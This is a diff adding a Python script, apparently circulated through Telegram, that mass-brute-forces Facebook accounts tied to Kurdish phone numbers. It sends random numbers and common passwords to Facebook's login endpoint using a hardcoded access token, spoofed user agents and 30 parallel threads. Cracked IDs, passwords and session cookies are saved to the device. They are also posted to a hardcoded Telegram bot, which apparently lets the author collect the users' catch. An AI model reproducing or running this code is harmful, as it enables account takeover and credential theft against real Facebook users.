@@ -1,0 +1,223 @@
+#• https://t.me/nazimmod
+#---------------------
+import datetime
+import sys
+import webbrowser
+webbrowser.open('https://t.me/nazimmod')
+
+target = datetime.date(2026, 2,4)
+
+
+now = datetime.date.today()
+
+if now >= target:
+    print("تم انتهاء مده اشتراكك راسل nazim يفعلك")
+    sys.exit()  
+else:
+    print("✅ تم تشغيل الاداة.")
+try:
+	import os,requests,time,re,random,sys,uuid,string,json,subprocess,base64,zlib,hashlib
+	from string import *
+	from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError: 
+	os.system('pip install requests > /dev/null')
+	exit('\n Run Again ')
+logo = '''
+
+███╗░░██╗░█████╗░███████╗██╗███╗░░░███╗
+████╗░██║██╔══██╗╚════██║██║████╗░████║
+██╔██╗██║███████║░░███╔═╝██║██╔████╔██║
+██║╚████║██╔══██║██╔══╝░░██║██║╚██╔╝██║
+██║░╚███║██║░░██║███████╗██║██║░╚═╝░██║
+╚═╝░░╚══╝╚═╝░░╚═╝╚══════╝╚═╝╚═╝░░░░░╚═╝
+\033[1;91m-----------------------\033[1;91m-------------------------------\033[1;91m| Telegram : {x} @Thv_1730 |
+\033[1;92m{+} Instagram : {c} @kym.a5 |
+\033[1;93m{+} TooI : {B} عشوائي | Facebook
+\033[1;94m{+} {B} Instagram 2(B) @kym.a5
+\033[1;95m{+} {Y} قناتي تلي :{C} https://t.me/nazimmod 
+\033[1;94m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬          \033[1;94m\033[1;92mTotal Ok Id Save in [nazim-OK.txt]\033[1;95m
+\033[1;94m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+          \033[1;93mTotal Cp Id Save in [nazim-CP.txt]      \033[1;91m    ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+\033[1;94m------------------------------------------------------
+\033[1;91mWhat should I say? :Shut up
+\033[1;91m Name        : nazim
+\033[1;91m Telegram    : @Thv_1730
+\033[1;91m Status      : VIP
+\033[1;97m--------------------------------------------------
+ \033[1;92m ✧ \033[1;96m صلي على نبيك محمد  \033[1;92m ✧
+'''
+token = "8168659026:AAE9nLZlNeQNTWGzn27MFptH9eCiZOqGfXE"
+ID = "2145126697"
+
+loop = 0
+oks = []
+pcp=[]
+cps=[]
+#---------------------MKING-MENU---------------------#
+def menu():
+	os.system('clear')
+	print(logo)
+	print('\033[1;94m[1] CRACK RANDOM (VIP) ')
+	print('\033[1;91m△▽△▽△▽△▽△▽△▽△▽△▽△▽△▽△▽△')
+	print('\033[1;93m[0] DARCHUN (Exit Menu)')
+	print('\033[1;91m')
+	print(47*'-')
+	opt = input('\033[1;92m✅ خيارك : ')
+	if opt =='1':
+		afg_randome()
+	elif opt =='0':
+		menu()
+	else:
+		print('\033[1;91m [•] HalBzhera\033[0;97m')
+#---------------------MKING-RANDOM_CRACK---------------------#
+def afg_randome():
+	user=[]
+	os.system('clear')
+	print(logo)
+	print('[+] Cod Kurdstan (0750,0751,0770,0780,0781)....')
+	print(47*'-')
+	kode = input('[?] Halbzhera : ')
+	print(47*'-')
+	limit = int('99999')
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	with tred(max_workers=30) as ahd:
+		os.system('clear')
+		print(logo)
+		
+		tl = str(len(user))
+		print('\x1b[1;91m[\x1b[1;92m+\x1b[1;91m] \x1b[1;94mHAMU IDS : \033[1;92m'+tl)
+		print('\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] \x1b[1;93mRawsta Ta 15 Daqa Wa Crack Akam...\x1b[1;92m(\033[1;91m nazim \033[1;92m)')
+		print('\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] \x1b[1;94mBo Wastandne Toolka Ctrl Z Dabgra \033[1;91m)');print(47*'-')
+		for guru in user:
+			ids = kode+guru
+			mking_pass = [ids,guru,'hamahama','١٢٣٤٥٦٧٨٩','hama1234','zaxozaxo','zaxo1234','١٢٣٤٥٦','kurdkurd','kurd1234','07500750',]
+			ahd.submit(rndm,ids,mking_pass)
+	print(47*'\n\033[1;37m-')
+	print('[✓] Crack process has been completed')
+	print('[?] Total Ok Id Save in  /sdcard/nazim-OK.txt')
+	print('[?] Total Cp Id Save in  /sdcard/nazim-CP.txt')
+	print(47*'-')
+	print(' Press Inter To Back Menu')
+#---------------------START-CRACK---------------------#
+def rndm(ids,mking_pass):
+	try:
+		
+		global loop
+		sys.stdout.write(f'\r\033[1;91m [nazim] {loop}\033[1;92m | OK | {len(oks)}\033[1;93m | CP | {len(cps)} |')
+		sys.stdout.flush()
+		for pas in mking_pass:
+			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+			fbbv = str(random.randint(111111111,999999999))
+			android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
+			model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
+			build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
+			fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
+			fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
+			headers = {
+    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; K) [FBAN/FB4A;FBAV/423.0.0.21.64;FBBV/591736697;FBPN/com.facebook.katana;FBLC/nl_NL;FBMF/HUAWEI;FBBD/unknown;FBDV/unknown;FBSV/11;FBCA/armeabi-v7a;FBCR/du;FBOP/1;FBLOADER/1]",
+    "Accept": "*/*",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Connection": "keep-alive"
+  }
+
+			headers = {
+    "user-agent": "Mozilla/5.0 (Linux; Android 10; POCO X3 Pro Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6090.90 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/260.0.0.6.77;]"
+}
+			ua='Dalvik/2.1.0 (Linux; U; Android 11; K) [FBAN/FB4A;FBAV/423.0.0.21.64;FBBV/591736697;FBPN/com.facebook.katana;FBLC/nl_NL;FBMF/HUAWEI;FBBD/unknown;FBDV/unknown;FBSV/11;FBCA/armeabi-v7a;FBCR/du;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 10; K) [FBAN/FB4A;FBAV/445.0.0.37.116;FBBV/734988408;FBPN/com.facebook.katana;FBLC/ar_AR;FBMF/Motorola;FBBD/unknown;FBDV/unknown;FBSV/10;FBCA/arm64-v8a;FBCR/Zain;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 11; K) [FBAN/FB4A;FBAV/435.0.0.38.95;FBBV/667700789;FBPN/com.facebook.katana;FBLC/it_IT;FBMF/HUAWEI;FBBD/unknown;FBDV/unknown;FBSV/11;FBCA/arm64-v8a;FBCR/STC;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 10; K) [FBAN/FB4A;FBAV/433.0.0.31.111;FBBV/782276815;FBPN/com.facebook.katana;FBLC/de_DE;FBMF/Xiaomi;FBBD/unknown;FBDV/unknown;FBSV/10;FBCA/armeabi-v7a;FBCR/Mobily;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 14; K) [FBAN/FB4A;FBAV/435.0.0.38.95;FBBV/924957574;FBPN/com.facebook.katana;FBLC/hi_IN;FBMF/ZTE;FBBD/unknown;FBDV/unknown;FBSV/14;FBCA/armeabi-v7a;FBCR/China Mobile;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 9; K) [FBAN/FB4A;FBAV/443.0.0.43.116;FBBV/591441471;FBPN/com.facebook.katana;FBLC/en_GB;FBMF/ZTE;FBBD/unknown;FBDV/unknown;FBSV/9;FBCA/arm64-v8a;FBCR/Zain;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 12; K) [FBAN/FB4A;FBAV/427.0.0.36.118;FBBV/875957706;FBPN/com.facebook.katana;FBLC/nl_NL;FBMF/vivo;FBBD/unknown;FBDV/unknown;FBSV/12;FBCA/arm64-v8a;FBCR/Etisalat;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 12; K) [FBAN/FB4A;FBAV/439.0.0.28.119;FBBV/392864806;FBPN/com.facebook.katana;FBLC/hi_IN;FBMF/Xiaomi;FBBD/unknown;FBDV/unknown;FBSV/12;FBCA/armeabi-v7a;FBCR/Orange;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 13; K) [FBAN/FB4A;FBAV/445.0.0.37.116;FBBV/446382962;FBPN/com.facebook.katana;FBLC/ru_RU;FBMF/OPPO;FBBD/unknown;FBDV/unknown;FBSV/13;FBCA/arm64-v8a;FBCR/China Mobile;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 12; K) [FBAN/FB4A;FBAV/437.0.0.33.118;FBBV/912340585;FBPN/com.facebook.katana;FBLC/ja_JP;FBMF/Sony;FBBD/unknown;FBDV/unknown;FBSV/12;FBCA/armeabi-v7a;FBCR/Zain;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 13; K) [FBAN/FB4A;FBAV/425.0.0.22.96;FBBV/992986819;FBPN/com.facebook.katana;FBLC/ru_RU;FBMF/Sony;FBBD/unknown;FBDV/unknown;FBSV/13;FBCA/armeabi-v7a;FBCR/Verizon;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 13; K) [FBAN/FB4A;FBAV/443.0.0.43.116;FBBV/318173454;FBPN/com.facebook.katana;FBLC/de_DE;FBMF/Lenovo;FBBD/unknown;FBDV/unknown;FBSV/13;FBCA/armeabi-v7a;FBCR/Verizon;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 13; K) [FBAN/FB4A;FBAV/433.0.0.31.111;FBBV/224396697;FBPN/com.facebook.katana;FBLC/pt_BR;FBMF/Google;FBBD/unknown;FBDV/unknown;FBSV/13;FBCA/armeabi-v7a;FBCR/STC;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 10; K) [FBAN/FB4A;FBAV/445.0.0.37.116;FBBV/473062648;FBPN/com.facebook.katana;FBLC/tr_TR;FBMF/vivo;FBBD/unknown;FBDV/unknown;FBSV/10;FBCA/arm64-v8a;FBCR/Ooredoo;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 10; K) [FBAN/FB4A;FBAV/437.0.0.33.118;FBBV/772741414;FBPN/com.facebook.katana;FBLC/hi_IN;FBMF/Nokia;FBBD/unknown;FBDV/unknown;FBSV/10;FBCA/armeabi-v7a;FBCR/STC;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 13; K) [FBAN/FB4A;FBAV/429.0.0.27.114;FBBV/799372542;FBPN/com.facebook.katana;FBLC/nl_NL;FBMF/OnePlus;FBBD/unknown;FBDV/unknown;FBSV/13;FBCA/arm64-v8a;FBCR/AT&T;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 13; K) [FBAN/FB4A;FBAV/441.0.0.37.70;FBBV/924166660;FBPN/com.facebook.katana;FBLC/ru_RU;FBMF/OnePlus;FBBD/unknown;FBDV/unknown;FBSV/13;FBCA/arm64-v8a;FBCR/Ooredoo;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 11; K) [FBAN/FB4A;FBAV/439.0.0.28.119;FBBV/265723345;FBPN/com.facebook.katana;FBLC/ko_KR;FBMF/realme;FBBD/unknown;FBDV/unknown;FBSV/11;FBCA/arm64-v8a;FBCR/Reliance Jio;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 13; K) [FBAN/FB4A;FBAV/423.0.0.21.64;FBBV/753029449;FBPN/com.facebook.katana;FBLC/it_IT;FBMF/ZTE;FBBD/unknown;FBDV/unknown;FBSV/13;FBCA/armeabi-v7a;FBCR/Verizon;FBOP/1;FBLOADER/1]Dalvik/2.1.0 (Linux; U; Android 12; K) [FBAN/FB4A;FBAV/445.0.0.37.116;FBBV/669513153;FBPN/com.facebook.katana;FBLC/en_GB;FBMF/OPPO;FBBD/unknown;FBDV/unknown;FBSV/12;FBCA/arm64-v8a;FBCR/AT&T;FBOP/1;FBLOADER/1]Mozilla/5.0 (Linux; Android 11; OPPO A74 Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6216.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/259.0.0.5.88;]Mozilla/5.0 (Linux; Android 10; POCO X3 Pro Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6090.90 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/260.0.0.6.77;]Mozilla/5.0 (Linux; Android 13; Redmi 9 Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6090.90 Mobile Safari/537.36 [FBAN/EMA;FBLC/fr_FR;FBAV/258.0.0.4.99;]Mozilla/5.0 (Linux; Android 10; vivo X80 Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6471.90 Mobile Safari/537.36 [FBAN/EMA;FBLC/tr_TR;FBAV/263.0.0.9.55;]Mozilla/5.0 (Linux; Android 12; SM-G991B Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6425.90 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/265.0.0.12.50;]Mozilla/5.0 (Linux; Android 12; Mi 11X Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.70 Mobile Safari/537.36 [FBAN/EMA;FBLC/fr_FR;FBAV/264.0.0.11.34;]Mozilla/5.0 (Linux; Android 14; SM-A326B Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6168.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/es_ES;FBAV/266.0.0.14.55;]Mozilla/5.0 (Linux; Android 13; POCO F4 Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6168.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/ar_SA;FBAV/262.0.0.7.88;]Mozilla/5.0 (Linux; Android 12; Xiaomi 12T Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6471.90 Mobile Safari/537.36 [FBAN/EMA;FBLC/ru_RU;FBAV/266.0.0.14.55;]Mozilla/5.0 (Linux; Android 12; Mi 10T Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6383.95 Mobile Safari/537.36 [FBAN/EMA;FBLC/ar_IQ;FBAV/260.0.0.6.77;]Mozilla/5.0 (Linux; Android 13; OPPO A74 Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6168.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/tr_TR;FBAV/266.0.0.14.55;]Mozilla/5.0 (Linux; Android 14; vivo Y76 Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6216.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/ar_SA;FBAV/259.0.0.5.88;]Mozilla/5.0 (Linux; Android 11; Mi 11X Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.70 Mobile Safari/537.36 [FBAN/EMA;FBLC/ru_RU;FBAV/265.0.0.12.50;]Mozilla/5.0 (Linux; Android 12; M2007J20CG Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6383.95 Mobile Safari/537.36 [FBAN/EMA;FBLC/es_ES;FBAV/264.0.0.11.34;]Mozilla/5.0 (Linux; Android 12; POCO X3 Pro Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6471.90 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/260.0.0.6.77;]Mozilla/5.0 (Linux; Android 14; SM-G780F Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6216.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/260.0.0.6.77;]Mozilla/5.0 (Linux; Android 11; Tecno Pova 3 Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6168.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/pt_BR;FBAV/264.0.0.11.34;]Mozilla/5.0 (Linux; Android 12; Mi 11X Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.70 Mobile Safari/537.36 [FBAN/EMA;FBLC/tr_TR;FBAV/262.0.0.7.88;]Mozilla/5.0 (Linux; Android 12; Xiaomi 12T Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6383.95 Mobile Safari/537.36 [FBAN/EMA;FBLC/ru_RU;FBAV/262.0.0.7.88;]Mozilla/5.0 (Linux; Android 10; M2007J20CG Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6471.90 Mobile Safari/537.36 [FBAN/EMA;FBLC/ar_IQ;FBAV/259.0.0.5.88;]Mozilla/5.0 (Linux; Android 11; SM-A536E Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6090.90 Mobile Safari/537.36 [FBAN/EMA;FBLC/fr_FR;FBAV/264.0.0.11.34;]Mozilla/5.0 (Linux; Android 13; Redmi Note 12 Pro Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6425.90 Mobile Safari/537.36 [FBAN/EMA;FBLC/ar_IQ;FBAV/259.0.0.5.88;]Mozilla/5.0 (Linux; Android 10; Pixel 6 Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6216.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/ar_IQ;FBAV/262.0.0.7.88;]Mozilla/5.0 (Linux; Android 11; Infinix Zero 30 Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6168.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/de_DE;FBAV/258.0.0.4.99;]Mozilla/5.0 (Linux; Android 14; Redmi Note 10 Pro Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6216.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/ru_RU;FBAV/260.0.0.6.77;]Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6383.95 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/265.0.0.12.50;]Mozilla/5.0 (Linux; Android 11; M2007J20CG Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6090.90 Mobile Safari/537.36 [FBAN/EMA;FBLC/es_ES;FBAV/262.0.0.7.88;]Mozilla/5.0 (Linux; Android 11; Pixel 7 Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6168.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/ar_IQ;FBAV/260.0.0.6.77;]Mozilla/5.0 (Linux; Android 11; SM-G991B Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.70 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/266.0.0.14.55;]Mozilla/5.0 (Linux; Android 12; SM-A326B Build/RP1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6168.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/ru_RU;FBAV/265.0.0.12.50;]'
+			ua = 'Dalvik/2.1.0 (Linux; U; Android)Dalvik/2.1.0 (Linux; U; Android)Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+model+' Build/'+build+') [FBAN/Orca-Android;FBAV/'+fbav+';FBBV/'+fbbv+';FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+android_version+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'
+			accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+			data ={"locale": "en_GB","format": "json","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": 1}
+			head = {
+    'authority': 'graph.facebook.com',
+    'user-agent': ua,
+    'Host': 'graph.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'Content-Type': 'application/json;charset=utf-8',
+    'Content-Length': '595',
+    'Connection': 'Keep-Alive',
+    'Accept-Encoding': 'gzip',
+    'dpr': '3.375',
+    'origin': 'https://www.facebook.com',
+    'referer': 'https://www.facebook.com/?_rdr',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+    'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'viewport-width': '980'
+}
+			po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
+			if 'session_key' in po:
+				uid = po['uid']
+				coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
+				print('\r\r\033[1;32m [nazim-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+				print('\r\r\033[1;32m [COOKIES] %s   '%(coki))
+				ff =f'''╔═════════════════╗
+                    𝑆𝐶𝐴𝑅𝑆 جابلك حساب شغال ✅
+╚═════════════════╝
+⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
+
+(𖣘) જ⁀➴  -  𝐈𝐃       : {uid}
+
+(𖣘) જ⁀➴  -  𝗣𝗔𝗦𝗦    : {pas}
+
+(𖣘) જ⁀➴  -  𝐂𝐎𝐎𝐊𝐈𝐄𝐒 : {coki}
+
+(𖣘) જ⁀➴  -  URL | https://www.facebook.com/profile.php?id={uid} 
+(𖣘) જ⁀➴  -  
+𝐂𝐇𝐀𝐍𝐍𝐄𝐋 : @Thv_1730
+
+(𖣘) જ⁀➴  -  𝗗𝗘𝗩     : @Thv_1730
+
+⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
+
+ لاتنسى صور الصيد ❤『@Thv_1730』                    
+                     '''            
+				requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}")
+				open('/sdcard/nazim-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
+				oks.append(str(uid))
+				break
+			elif 'www.facebook.com' in po['error']['message']:
+				uid = po['error']['error_data']['uid']
+				print('\r\r\x1b[1;33m [nazim-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+				ff =f'''
+            ╔═════════════════╗
+                    𝑆𝐶𝐴𝑅𝑆 جابلك حساب سيكور ❌
+╚═════════════════╝
+⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
+
+(𖣘) જ⁀➴  -  𝐈𝐃       : {uid}
+
+(𖣘) જ⁀➴  -  𝗣𝗔𝗦𝗦    : {pas}
+
+(𖣘) જ⁀➴  -  URL | https://www.facebook.com/profile.php?id={uid} 
+(𖣘) જ⁀➴  -  𝐂𝐇𝐀𝐍𝐍𝐄𝐋 : @Thv_1730
+
+(𖣘) જ⁀➴  -  𝗗𝗘𝗩     : @Thv_1730
+
+⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
+
+لاتنسى صور الصيد ❤『@Thv_1730』
+                     '''  
+				requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}")
+				open('/sdcard/nazim-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+				cps.append(str(uid))
+				break
+			else:continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(30)
+	except Exception as e:
+		pass
+menu()
